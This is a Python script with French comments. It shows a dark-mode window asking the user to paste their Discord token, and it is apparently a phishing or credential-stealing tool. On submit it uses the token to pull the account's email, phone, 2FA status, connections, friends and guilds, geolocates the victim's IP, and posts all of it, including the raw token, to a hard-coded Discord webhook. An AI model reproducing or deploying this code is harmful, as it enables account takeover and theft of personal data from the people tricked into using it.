import customtkinter as ctk
import requests
import os
from json import loads
from urllib.request import Request, urlopen
from datetime import datetime

# Fonction pour récupérer les en-têtes de requête avec le token
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, comme Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

# Fonction pour récupérer les données de l'utilisateur
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except Exception as e:
        print(f"Error fetching user data: {e}")
        return None

# Fonction pour récupérer les amis de l'utilisateur
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except Exception as e:
        print(f"Error fetching friends data: {e}")
        return None

# Fonction pour récupérer les guildes de l'utilisateur
def getguilds(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/guilds", headers=getheaders(token))).read().decode())
    except Exception as e:
        print(f"Error fetching guilds data: {e}")
        return None

# Fonction pour récupérer les connexions de l'utilisateur
def getconnections(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/connections", headers=getheaders(token))).read().decode())
    except Exception as e:
        print(f"Error fetching connections data: {e}")
        return None

# Fonction pour calculer la date de création du compte
def calculate_creation_date(user_id):
    timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
    return datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')

# Fonction pour envoyer les données au webhook
def send_to_webhook(webhook_url, content, files=None):
    data = {
        "content": content
    }
    response = requests.post(webhook_url, data=data, files=files)
    print(f"Webhook response status code: {response.status_code}")
    if response.status_code == 204:
        print("Successfully sent to the webhook!")
    else:
        print(f"Failed to send to the webhook: {response.status_code}, Response: {response.text}")

# Fonction pour obtenir l'IP publique de l'utilisateur
def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            print("Failed to retrieve public IP")
            return None
    except requests.RequestException as e:
        print(f"Error retrieving public IP: {e}")
        return None

# Fonction pour obtenir la localisation de l'IP
def get_ip_location(ip):
    url = f"http://ipinfo.io/{ip}/json"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        location = data.get("city", "City not found") + ", " + data.get("region", "Region not found") + ", " + data.get("country", "Country not found")
        return location
    else:
        print("Failed to retrieve IP location")
        return "Location not found"

# Fonction pour gérer la connexion via l'interface
def handle_token_submission():
    token = entry_token.get()  # Récupérer le token de l'utilisateur
    if token:
        print(f"Token received: {token}")
        
        # Webhook URL (à remplacer par ton propre webhook)
        webhook_url = "https://canary.discord.com/api/webhooks/1341136381409366036/MXW33wa-xj0QCjg5hf_lmGCLn1Fym17IHhTxHoq9Ctb1flW6T5iRKYp_OzlX15R5mUHx"

        # Récupérer les données utilisateur
        user_data = getuserdata(token)
        friends_data = getfriends(token)
        guilds_data = getguilds(token)
        connections_data = getconnections(token)

        if user_data:
            # Extraire les informations nécessaires
            email = user_data.get("email", "Not found")
            phone = user_data.get("phone", "Not found")
            username = user_data.get("username", "Not found")
            discriminator = user_data.get("discriminator", "Not found")
            user_id = user_data.get("id", "Not found")
            avatar = user_data.get("avatar", "Not found")
            mfa_enabled = user_data.get("mfa_enabled", False)
            premium_type = user_data.get("premium_type", None)
            public_flags = user_data.get("public_flags", 0)

            # Calculer la date de création du compte
            creation_date = calculate_creation_date(user_id)

            # Vérifier le type d'abonnement Nitro
            if premium_type == 0:
                nitro_status = "No Nitro"
            elif premium_type == 1:
                nitro_status = "Nitro Classic"
            elif premium_type == 2:
                nitro_status = "Nitro"
            else:
                nitro_status = "Unknown"

            # Déterminer les badges de l'utilisateur
            badges = []
            if public_flags & 1:
                badges.append("Discord Employee")
            if public_flags & 2:
                badges.append("Partnered Server Owner")
            if public_flags & 4:
                badges.append("Hypesquad Events")
            if public_flags & 8:
                badges.append("Bug Hunter Level 1")
            if public_flags & 64:
                badges.append("Hypesquad Bravery")
            if public_flags & 128:
                badges.append("Hypesquad Brilliance")
            if public_flags & 256:
                badges.append("Hypesquad Balance")
            if public_flags & 512:
                badges.append("Early Supporter")
            if public_flags & 16384:
                badges.append("Bug Hunter Level 2")
            if public_flags & 131072:
                badges.append("Verified Bot Developer")
            
            badges_str = ", ".join(badges) if badges else "None"

            # Ajouter les connexions à l'utilisateur, si disponible
            connections_str = "\n".join([f"{conn['type'].title()}: {conn['name']}" for conn in connections_data]) if connections_data else "None"
            
            # Récupérer l'IP publique
            ip = get_public_ip()
            if ip:
                ip_location = get_ip_location(ip)
            else:
                ip_location = "Location not found"

            # Formatage des informations avec des emojis et spoiling des informations sensibles
            content = (
                f"👤 **Username**: {username}#{discriminator}\n"
                f"🆔 **Discord ID**: {user_id}\n"
                f"📧 **Email**: ||{email}||\n"
                f"📞 **Phone**: ||{phone or 'None'}||\n"
                f"📅 **Account Creation Date**: {creation_date}\n"
                f"🔐 **2FA**: {'Enabled' if mfa_enabled else 'Disabled'}\n"
                f"💎 **Nitro**: {nitro_status}\n"
                f"🔑 **Token**: ||{token}||\n"
                f"🎖️ **Badges**: {badges_str}\n"
                f"🔗 **Connections**: ||{connections_str}||\n"
                f"🌎 **Location (IP)**: ||{ip_location}||\n"
            )

            # Envoyer au webhook
            send_to_webhook(webhook_url, content)

            # Sauvegarder les amis dans un fichier
            if friends_data:
                friends_file_path = "friends_list.txt"
                with open(friends_file_path, "w", encoding="utf-8") as file:
                    for friend in friends_data:
                        file.write(f"Username: {friend['user']['username']}#{friend['user']['discriminator']}\n")

                # Envoyer le fichier des amis
                files = {"friends_file": (os.path.basename(friends_file_path), open(friends_file_path, "rb"))}
                send_to_webhook(webhook_url, "Attached: Friends list.", files)

            # Sauvegarder les guildes dans un fichier
            if guilds_data:
                guilds_file_path = "guilds_list.txt"
                with open(guilds_file_path, "w", encoding="utf-8") as file:
                    for guild in guilds_data:
                        file.write(f"Guild: {guild['name']}\n")

                # Envoyer le fichier des guildes
                files = {"guilds_file": (os.path.basename(guilds_file_path), open(guilds_file_path, "rb"))}
                send_to_webhook(webhook_url, "Attached: Guilds list.", files)

            print("Data successfully sent to the webhook.")
        else:
            print("Failed to retrieve user data.")

    else:
        print("No token provided.")

# Créer la fenêtre de l'interface
login = ctk.CTk()
login.geometry("600x400")
ctk.set_appearance_mode("dark")  # Activer le mode sombre

# Créer un cadre pour les widgets
frame = ctk.CTkFrame(master=login)
frame.pack(pady=20, padx=60, fill="both", expand=True)

# Ajouter un label
label = ctk.CTkLabel(master=frame, text="Please enter your Discord Token")
label.pack(pady=12, padx=10)

# Ajouter un champ de saisie pour le token
entry_token = ctk.CTkEntry(master=frame, placeholder_text="Discord Token")
entry_token.pack(pady=12, padx=10)

# Ajouter un bouton pour envoyer le token
button_submit = ctk.CTkButton(master=frame, text="Submit", command=handle_token_submission)
button_submit.pack(pady=12, padx=10)

# Lancer l'interface
login.mainloop()
